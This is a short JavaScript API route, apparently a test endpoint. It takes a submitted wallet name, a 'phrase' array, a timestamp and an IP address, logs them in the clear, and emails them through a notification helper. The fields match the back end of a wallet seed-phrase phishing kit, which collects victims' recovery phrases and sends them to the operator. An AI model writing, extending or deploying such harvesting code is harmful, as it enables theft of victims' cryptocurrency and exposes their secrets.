import { sendEmailNotification } from '../../../lib/email'

export async function POST(request) {
  try {
    const body = await request.json()
    const { id, selectedWallet, phrase, timestamp, ip } = body

    // Validate input
    if (!id || !selectedWallet || !phrase || !Array.isArray(phrase)) {
      return Response.json(
        { error: 'Invalid submission data provided' },
        { status: 400 }
      )
    }

    console.log('Testing email notification for submission:', { id, selectedWallet, phrase, timestamp, ip })

    // Send email notification
    const emailResults = await sendEmailNotification({
      id,
      selectedWallet,
      phrase,
      timestamp,
      ip
    })

    console.log('Email test results:', emailResults)
    
    // Check for errors in the results
    if (emailResults && emailResults.length > 0) {
      emailResults.forEach((result, index) => {
        if (result.status === 'rejected') {
          console.error(`Email ${index} failed:`, result.reason)
        } else if (result.value && result.value.error) {
          console.error(`Email ${index} error:`, result.value.error)
        }
      })
    }

    return Response.json({
      success: true,
      message: 'Test email sent successfully',
      emailResults
    })

  } catch (error) {
    console.error('Error sending test email:', error)
    return Response.json(
      { error: 'Failed to send test email: ' + error.message },
      { status: 500 }
    )
  }
}
